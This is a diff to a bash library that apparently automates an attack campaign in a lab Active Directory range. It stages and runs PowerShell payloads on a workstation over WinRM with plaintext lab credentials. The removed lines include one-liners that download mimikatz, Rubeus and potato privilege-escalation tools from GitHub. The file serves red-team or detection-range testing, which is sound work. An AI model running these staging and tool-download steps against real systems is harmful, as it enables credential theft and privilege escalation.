@@ -23,19 +23,80 @@ ws01_exec_as() {
     bash "${CAMPAIGN_A_LIB}/ws01-exec.sh" "${cmd}"
 }
 
+# Resolve a payload under linux/ (bare name = windows/<name>).
+campaign_payload_src() {
+  local base="$1"
+  if [[ "${base}" == */* ]]; then
+    echo "${CAMPAIGN_A_LIB}/../${base}"
+  else
+    echo "${CAMPAIGN_A_LIB}/../windows/${base}"
+  fi
+}
+
+# Copy a repo payload onto ws01 C:\Tools\cadre-attack\<basename>.
+campaign_stage_file() {
+  local base="$1"
+  local src fname
+  src="$(campaign_payload_src "${base}")"
+  fname="$(basename "${base}")"
+  [[ -f "${src}" ]] || { echo "missing payload ${src}" >&2; return 1; }
+  bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${src}" "${fname}"
+}
+
+# Stage a repo .ps1 onto ws01, then hop-exec it. Payloads live in git.
+campaign_stage_run_ps1() {
+  local user="$1" pass="$2" base="$3"
+  local domain="${4:-child.cadre.local}"
+  local extra="${5:-}"
+  local fname
+  campaign_stage_file "${base}"
+  fname="$(basename "${base}")"
+  ws01_exec_as "${user}" "${pass}" \
+    "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\${fname} ${extra}" \
+    "${domain}"
+}
+
+# Run a staged .ps1 as local admin (vagrant WinRM) — not the AD hop.
+campaign_vagrant_run_ps1() {
+  local base="$1"
+  local fname ip
+  campaign_stage_file "${base}"
+  fname="$(basename "${base}")"
+  ip="${WS01_IP:-192.168.77.62}"
+  ansible -i "${ip}," all \
+    -e ansible_user=vagrant -e ansible_password=vagrant \
+    -e ansible_connection=winrm -e ansible_winrm_transport=basic \
+    -e ansible_winrm_scheme=http -e ansible_port=5985 \
+    -e ansible_winrm_server_cert_validation=ignore \
+    -m win_shell -a "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\${fname}"
+}
+
+# RedStrike default success marker: node-id with '-' → '_' + '_OK'
+campaign_ok() {
+  local id="$1"
+  echo "${id//-/_}_OK"
+}
+
+# Fail closed unless proof already exists in captured output, then emit marker.
+campaign_require_ok() {
+  local id="$1"
+  local text="$2"
+  local proof="${3:-}"
+  if [[ -n "${proof}" ]] && ! printf '%s' "${text}" | grep -qE "${proof}"; then
+    echo "${id}_FAIL: missing proof /${proof}/" >&2
+    exit 1
+  fi
+  campaign_ok "${id}"
+}
+
 ws01_ensure_rubeus() {
-  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
-    'if (-not (Test-Path C:\Tools\cadre-attack)) { New-Item -ItemType Directory -Force -Path C:\Tools\cadre-attack | Out-Null }; if (-not (Test-Path C:\Tools\cadre-attack\Rubeus.exe)) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" -OutFile C:\Tools\cadre-attack\Rubeus.exe -UseBasicParsing }; if (Test-Path C:\Tools\cadre-attack\Rubeus.exe) { Write-Output OK:Rubeus } else { Write-Output FAIL:Rubeus; exit 1 }'
+  campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-ensure-rubeus.ps1
 }
 
 ws01_ensure_mimikatz() {
-  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
-    'if (-not (Test-Path C:\Tools\cadre-attack)) { New-Item -ItemType Directory -Force -Path C:\Tools\cadre-attack | Out-Null }; if (-not (Test-Path C:\Tools\cadre-attack\mimikatz.exe)) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile C:\Tools\cadre-attack\mimikatz.zip -UseBasicParsing; Expand-Archive -Force C:\Tools\cadre-attack\mimikatz.zip C:\Tools\cadre-attack\mimikatz; Copy-Item C:\Tools\cadre-attack\mimikatz\x64\mimikatz.exe C:\Tools\cadre-attack\mimikatz.exe }; if (Test-Path C:\Tools\cadre-attack\mimikatz.exe) { Write-Output OK:mimikatz } else { Write-Output FAIL:mimikatz; exit 1 }'
+  campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-ensure-mimikatz.ps1
 }
 
 ws01_ensure_lpe_binaries() {
-  # Ensure local LPE binaries are present on ws01 before copying to mbr01/dc02/etc.
-  # Targets C:\Tools\ADTools (operator-managed staging directory on the initial beachhead).
-  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
-    'Set-StrictMode -Version 2; $ErrorActionPreference = "Stop"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $dir = "C:\Tools\ADTools"; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }; $tools = @{ "GodPotato-NET4.exe" = "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"; "PrintSpoofer64.exe" = "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"; "SweetPotato.exe" = "https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe"; "JuicyPotatoNG.zip" = "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip"; "RoguePotato.zip" = "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip" }; function Ensure($name,$url) { $path = Join-Path $dir $name; if (Test-Path $path) { Write-Output "OK:$name"; return }; $tmp = "$path.tmp"; Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing; Move-Item $tmp $path -Force; if ($name -like "*.zip") { Expand-Archive -Force $path $dir; Write-Output "EXTRACTED:$name" } else { Write-Output "DOWNLOADED:$name" } }; foreach ($t in $tools.GetEnumerator()) { Ensure $t.Key $t.Value }; if (-not (Test-Path (Join-Path $dir "JuicyPotatoNG.exe"))) { Get-ChildItem $dir -Filter "JuicyPotatoNG*.exe" | Select-Object -First 1 | ForEach-Object { Copy-Item $_.FullName (Join-Path $dir "JuicyPotatoNG.exe") -Force; Write-Output "RENAME:JuicyPotatoNG.exe" } }; if (-not (Test-Path (Join-Path $dir "RoguePotato.exe"))) { Get-ChildItem $dir -Filter "RoguePotato.exe" -Recurse | Select-Object -First 1 | ForEach-Object { Copy-Item $_.FullName (Join-Path $dir "RoguePotato.exe") -Force; Write-Output "RENAME:RoguePotato.exe" } }; foreach ($n in @("GodPotato-NET4.exe","PrintSpoofer64.exe","SweetPotato.exe","JuicyPotatoNG.exe","RoguePotato.exe")) { if (Test-Path (Join-Path $dir $n)) { Write-Output "READY:$n" } else { Write-Output "MISSING:$n" } }'
+  campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-ensure-lpe.ps1
 }
